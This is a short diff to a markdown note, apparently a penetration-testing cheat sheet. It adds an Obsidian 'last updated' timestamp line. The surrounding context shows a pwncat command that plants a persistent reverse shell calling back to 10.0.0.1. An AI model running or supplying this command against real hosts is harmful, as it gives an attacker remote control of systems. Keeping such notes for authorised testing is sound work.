@@ -30,3 +30,6 @@ This will search for python on host and make a persistence shell back to you.
 ```bash
 pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3
 ```
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
